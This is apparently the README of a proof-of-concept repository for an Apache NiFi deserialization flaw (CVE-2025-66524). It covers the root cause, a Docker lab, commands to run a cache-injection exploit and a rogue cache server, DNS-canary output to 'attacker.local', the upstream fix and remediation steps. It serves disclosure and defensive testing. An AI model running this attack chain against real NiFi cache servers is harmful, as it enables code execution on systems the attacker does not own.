# CVE-2025-66524: Apache NiFi GetAsanaObject Processor Remote Code Execution via Unsafe Deserialization

| | |
|---|---|
| **CVE** | CVE-2025-66524 |
| **Affected Software** | Apache NiFi (`GetAsanaObject` Processor) |
| **Affected Versions** | 1.20.0 through 2.6.0 |
| **Patched Version** | 2.7.0 |
| **CVSS** | 8.8 (HIGH) |
| **CWE** | CWE-502 — Deserialization of Untrusted Data |
| **Author** | [Exploit Intelligence Platform](https://exploit-intel.com) |

## Overview

CVE-2025-66524 is an unsafe Java deserialization vulnerability in the Apache NiFi `GetAsanaObject` processor (versions 1.20.0 through 2.6.0). The `GenericObjectSerDe` class uses `ObjectInputStream.readObject()` without any class filtering to deserialize data retrieved from a NiFi Distributed Map Cache server, which has **no authentication** by default (TCP port 4557). An attacker with network access to the cache server can inject crafted serialized Java objects, leading to arbitrary code execution within the NiFi JVM.

## Affected Versions

| Component | Affected | Patched |
|-----------|----------|---------|
| Apache NiFi | 1.20.0 through 2.6.0 (inclusive) | 2.7.0 |
| Vulnerable Module | `nifi-asana-processors` (`GetAsanaObject` processor) | — |
| Vulnerable Class | `GenericObjectSerDe.deserialize()` | Removed in 2.7.0 |

## CVSS Score

- **Score**: 8.8 / 10 — **HIGH**
- **Vector**: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

| Metric | Value |
|--------|-------|
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | Low |
| User Interaction | None |
| Confidentiality | High |
| Integrity | High |
| Availability | High |

## Root Cause

**CWE-502: Deserialization of Untrusted Data**

The `GenericObjectSerDe<V>` class in the `nifi-asana-processors` bundle implements Java's native `ObjectInputStream`/`ObjectOutputStream` serialization for reading and writing state data to NiFi's Distributed Map Cache. The `deserialize()` method creates an `ObjectInputStream` from raw bytes received over the network and calls `readObject()` without:

1. Any `ObjectInputFilter` or class-name whitelist
2. Any type validation before an unchecked `(V)` cast
3. Any integrity verification of the serialized data

```java
// GenericObjectSerDe.java — VULNERABLE
public V deserialize(byte[] value) throws DeserializationException, IOException {
    try (ObjectInputStream objectInputStream = new ObjectInputStream(
            new ByteArrayInputStream(value))) {
        return (V) objectInputStream.readObject();  // ← unrestricted deserialization
    }
}
```

The `GetAsanaObject` processor calls `recoverState()` at the start of every `onTrigger()` cycle (default: every 30 seconds), which fetches its state from the cache via `client.get()` and deserializes the result using `GenericObjectSerDe`. Since the Distributed Map Cache server has **no authentication mechanism**, any attacker with TCP connectivity to port 4557 can inject a malicious serialized Java object that will be deserialized by the NiFi JVM on the next processor trigger.

## Lab Setup

### Prerequisites

- Docker with compose plugin
- ~4 GB RAM (NiFi requires significant heap)

### Build and Start

```bash
docker compose build
docker compose up -d
```

Wait approximately 60–90 seconds for NiFi to fully initialize, then configure the NiFi flow:

```bash
docker exec cve-2025-66524-nifi bash /opt/nifi/setup-flow.sh
```

### Containers

| Container | Image | Role | Key Ports |
|-----------|-------|------|-----------|
| `cve-2025-66524-nifi` | `apache/nifi:2.6.0` (custom) | Vulnerable NiFi instance with `GetAsanaObject` processor | 8443 (HTTPS UI) |
| `cve-2025-66524-services` | `python:3.11-slim` (custom) | Mock Asana API + NiFi Distributed Map Cache server | 8888 (HTTP), **4557 (TCP — attack surface)** |

### Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│  Docker Network: lab-net                                        │
│                                                                 │
│  ┌──────────────────────────┐  ┌─────────────────────────────┐  │
│  │ cve-2025-66524-services  │  │  cve-2025-66524-nifi        │  │
│  │                          │  │  (Apache NiFi 2.6.0)        │  │
│  │ Mock Asana API (:8888)   │◄─│  AsanaClientProvider        │  │
│  │ NiFi Cache Server (:4557)│◄─│  MapCacheClientService      │  │
│  │                          │  │  GetAsanaObject Processor    │  │
│  │  *** ATTACK SURFACE ***  │  │    → recoverState() q/30s   │  │
│  └──────────────────────────┘  │    → GenericObjectSerDe      │  │
│                                │      .deserialize() → RCE   │  │
│  Attacker connects to          └─────────────────────────────┘  │
│  port 4557 (no auth)                                            │
└─────────────────────────────────────────────────────────────────┘
```

### NiFi Credentials

- **URL**: `https://localhost:8443/nifi` (inside Docker network)
- **Username**: `admin`
- **Password**: `adminadminadmin`

## PoC Usage

### Primary PoC: Cache Injection with URLDNS Gadget (`poc.py`)

Injects a URLDNS gadget chain payload into the NiFi Distributed Map Cache server. When the `GetAsanaObject` processor triggers, `GenericObjectSerDe.deserialize()` calls `ObjectInputStream.readObject()` on the attacker-controlled bytes, causing a DNS lookup for a canary hostname — proving arbitrary deserialization.

```bash
python3 poc/poc.py cve-2025-66524-services 4557
```

**Expected Output:**
```
======================================================================
CVE-2025-66524: Apache NiFi GetAsanaObject Unsafe Deserialization
======================================================================

[*] Step 1: Loading payloads...
    Key: serialized UUID 'a734f87d-019c-1000-57b2-e511d156e143' (43 bytes)
    Payload: URLDNS gadget for 'nifi-deser-proof-cve-2025-66524.attacker.local' (337 bytes)

[*] Step 4: Connecting to NiFi Distributed Map Cache server...
[+] Connected to cve-2025-66524-services:4557
[+] Handshake successful (RESOURCE_OK)

[*] Step 4b: Injecting URLDNS payload into cache...
    [+] PUT SUCCESS — malicious payload injected into cache!

[*] Step 5: Waiting for GetAsanaObject processor to trigger...
    [35/35] seconds elapsed...

[*] Step 6: Checking for evidence of deserialization...
  [*] 6a: Checking DNS packet capture...
    [+] DNS QUERY DETECTED for canary hostname!
    DNS capture output:
          172.28.0.3.42175 > 100.64.100.1.53: 28578+ AAAA? nifi-deser-proof-cve-2025-66524.attacker.local. (64)
          172.28.0.3.54871 > 100.64.100.1.53: 41123+ A? nifi-deser-proof-cve-2025-66524.attacker.local. (64)
```

### Vector 2: Rogue Cache Server (`poc_vector2_rogue_server.py`)

Implements a full NiFi Distributed Map Cache server that responds to every GET request with a malicious serialized payload. Demonstrates the alternative attack vector via network-level redirection or NiFi configuration modification.

```bash
python3 poc_vector2_rogue_server.py [listen_port] [payload_file]
```

### Vector 3: CC4 RCE Analysis (`poc_vector3_cc4_rce.py`)

Documents the attempt to achieve full RCE via CommonsCollections4 gadget chain. Blocked by CC4 4.5.0 security hardening (dangerous transformer classes are no longer `Serializable`).

```bash
python3 poc_vector3_cc4_rce.py
```

### Supporting Files

| File | Description |
|------|-------------|
| `PayloadGenerator.java` | Java utility to generate URLDNS and serialized-key payloads |
| `CC4PayloadGenerator.java` | Java utility documenting CC4 chain generation failure |
| `urldns_payload.bin` | Pre-generated URLDNS payload (337 bytes) |
| `state_key.bin` | Serialized processor UUID key (43 bytes) |

## Verification

### Vulnerable (NiFi 2.6.0) — CONFIRMED ✓

The URLDNS gadget chain was successfully deserialized by the NiFi JVM, triggering DNS queries from the NiFi container to the attacker-controlled canary hostname:

```
02:57:13.104405 IP 172.28.0.3.42175 > 100.64.100.1.53: AAAA? nifi-deser-proof-cve-2025-66524.attacker.local. (64)
02:57:13.104459 IP 172.28.0.3.54871 > 100.64.100.1.53: A? nifi-deser-proof-cve-2025-66524.attacker.local. (64)
```

This proves the full attack chain:
1. **Unauthenticated cache access** — connected to TCP 4557 with zero credentials
2. **Cache protocol exploitation** — completed NiFi handshake and injected payload via PUT
3. **Arbitrary deserialization** — `ObjectInputStream.readObject()` executed on attacker-controlled bytes
4. **Gadget chain execution** — URLDNS chain triggered DNS lookup: `HashMap.readObject()` → `URL.hashCode()` → `URLStreamHandler.hashCode()` → `InetAddress.getByName()` → DNS query

Reproducibility was confirmed with a second payload using a different canary hostname (`second-test-cve-2025-66524.proof.local`).

### Patched (NiFi 2.7.0) — Safe

In version 2.7.0, `GenericObjectSerDe` is deleted entirely and replaced with:
- **`StringSerDe`** — serializes keys using `String.getBytes(UTF_8)` (no Java object serialization)
- **`MapStringSerDe`** — serializes values using Google Gson JSON (no Java object serialization)

Injecting a Java serialized object into the cache of a patched NiFi instance would result in a JSON parse error or garbage string — `ObjectInputStream` is never instantiated.

### RCE Assessment

| Gadget Chain | Result | Notes |
|-------------|--------|-------|
| **URLDNS** (JDK-only) | ✅ **CONFIRMED** | DNS callback proves arbitrary deserialization |
| **CommonsCollections4** | ❌ Blocked | CC4 4.5.0 removed `Serializable` from `InvokerTransformer` |
| **Real-world RCE** | ⚠️ HIGH risk | NiFi deployments with Groovy NAR, Spring, or other NARs contain gadget-chain-compatible libraries |

## Fix

### Upstream Fix (NiFi 2.7.0)

**Commit**: [`1c081c15544b8459d69daaae2056f0f433cafce6`](https://github.com/apache/nifi/commit/1c081c15544b8459d69daaae2056f0f433cafce6)
**JIRA**: [NIFI-15292](https://issues.apache.org/jira/browse/NIFI-15292)
**PR**: [#10599](https://github.com/apache/nifi/pull/10599)

The fix completely eliminates Java native object serialization from the Asana processor:

1. **Deleted** `GenericObjectSerDe.java` — the vulnerable class using `ObjectInputStream.readObject()`
2. **Added** `StringSerDe.java` — UTF-8 byte encoding for String cache keys
3. **Added** `MapStringSerDe.java` — Google Gson JSON encoding for `Map<String, String>` cache values
4. **Updated** `GetAsanaObject.java` — replaced serializer type declarations:

```java
// BEFORE (vulnerable):
protected static final GenericObjectSerDe<String> STATE_MAP_KEY_SERIALIZER = new GenericObjectSerDe<>();
protected static final GenericObjectSerDe<Map<String, String>> STATE_MAP_VALUE_SERIALIZER = new GenericObjectSerDe<>();

// AFTER (fixed):
protected static final StringSerDe STATE_MAP_KEY_SERIALIZER = new StringSerDe();
protected static final MapStringSerDe STATE_MAP_VALUE_SERIALIZER = new MapStringSerDe();
```

**Fix quality**: Thorough and complete. The root cause (unrestricted `ObjectInputStream.readObject()`) is entirely eliminated. No bypass is possible on the fixed code — neither Gson JSON parsing nor UTF-8 string conversion can trigger Java object deserialization.

### Recommended Remediation

- **Upgrade** to Apache NiFi 2.7.0 or later
- **Network segmentation**: Restrict access to the Distributed Map Cache server port (4557) — it has no authentication
- **Monitor**: Check NiFi logs for `Failed to recover state` messages that may indicate exploitation attempts

## References

| Resource | URL |
|----------|-----|
| Vendor Advisory | https://lists.apache.org/thread/k9h004ydjg7opdvxr0nfywtzf33z60d7 |
| NVD Entry | https://nvd.nist.gov/vuln/detail/CVE-2025-66524 |
| GitHub Advisory | https://github.com/advisories/GHSA-v4p2-2w39-mhrj |
| Fix Commit | https://github.com/apache/nifi/commit/1c081c15544b8459d69daaae2056f0f433cafce6 |
| Fix PR | https://github.com/apache/nifi/pull/10599 |
| JIRA Issue | https://issues.apache.org/jira/browse/NIFI-15292 |
| OSS-Security | http://www.openwall.com/lists/oss-security/2025/12/18/2 |
| CVE Record | https://www.cve.org/CVERecord?id=CVE-2025-66524 |
| Apache NiFi | https://nifi.apache.org/ |

## Timeline

| Date | Event |
|------|-------|
| 2025-12-01 | Vulnerability reported by Jaeyeong Lee |
| 2025-12-03 | Fix developed by David Handermann (exceptionfactory) |
| 2025-12-04 | Fix committed by Pierre Villard |
| 2025-12-18 | Public disclosure on oss-security mailing list |
| 2025-12-19 | CVE-2025-66524 published |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help security professionals, system administrators, and researchers understand and verify the impact of CVE-2025-66524 in controlled lab environments.

**Do not use this tool against systems you do not own or have explicit written authorization to test.** Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent laws in most jurisdictions.

The authors assume no liability for misuse of the materials in this repository. By using these tools, you agree to comply with all applicable laws and regulations.

This PoC was generated by the [Exploit Intelligence Platform](https://exploit-intel.com).
